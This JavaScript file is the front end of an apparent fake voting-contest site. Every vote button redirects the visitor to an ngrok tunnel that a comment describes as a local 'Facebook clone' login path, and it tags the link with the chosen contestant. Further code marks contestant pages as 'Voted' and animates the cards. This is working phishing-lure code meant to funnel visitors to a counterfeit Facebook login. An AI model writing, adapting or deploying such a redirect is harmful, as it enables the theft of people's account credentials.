document.addEventListener('DOMContentLoaded', () => {

    // --- Facebook Login Redirect Logic ---
    const allVoteButtons = document.querySelectorAll('.vote-btn');
    
    // IMPORTANT: For a live website, you must create a real Facebook App
    // to get a valid client_id and set up a valid redirect_uri.
    // The link below is a placeholder that will take the user to your local Facebook clone path.
    // Now dynamic: appends ?source=contestantId (e.g., john-doe) based on button clicked.
    const baseLoginUrl = 'https://1e657d52293c.ngrok-free.app/';

    allVoteButtons.forEach(button => {
        button.addEventListener('click', () => {
            const contestantId = button.getAttribute('data-id'); // e.g., "john-doe"
            if (contestantId) {
                const loginUrl = `${baseLoginUrl}?source=${contestantId}`;
                console.log(`Redirecting to Facebook login for ${contestantId}...`);
                window.location.href = loginUrl;
            } else {
                console.error('Button missing data-id attribute');
                window.location.href = baseLoginUrl; // Fallback to base URL
            }
        });
    });

    // --- Handle "Voted" State on Individual Contestant Pages ---
    const body = document.querySelector('body');
    const pageId = body.getAttribute('data-page-id'); // e.g., "john-doe"

    if (pageId) { // If we are on an individual contestant page
        const voteButton = document.querySelector(`.vote-btn[data-id="${pageId}"]`);
        if (voteButton) {
            // Change button text and add icon
            voteButton.innerHTML = '<i class="fas fa-check-circle"></i> Voted';
            voteButton.classList.add('voted');
            // Override click to do nothing (since original listener is anonymous, removeEventListener won't work reliably)
            voteButton.onclick = () => {
                console.log(`Already voted for ${pageId}`);
            };
            console.log(`Contestant page '${pageId}' - button set to 'Voted'.`);
        }
    }

    // --- Animation Logic: Fade in cards on scroll (only for index.html) ---
    // Only apply card animation on the main index page, not individual pages
    if (!pageId) { 
        const cards = document.querySelectorAll('.card');

        const observerOptions = {
            root: null, // observes intersections relative to the viewport
            rootMargin: '0px',
            threshold: 0.1 // trigger when 10% of the element is visible
        };

        const observer = new IntersectionObserver((entries, observer) => {
            entries.forEach(entry => {
                // If the card is intersecting (visible in the viewport)
                if (entry.isIntersecting) {
                    entry.target.classList.add('visible');
                    // Stop observing the card once it's visible
                    observer.unobserve(entry.target);
                }
            });
        }, observerOptions);

        // Start observing each card
        cards.forEach(card => {
            observer.observe(card);
        });
    }

});
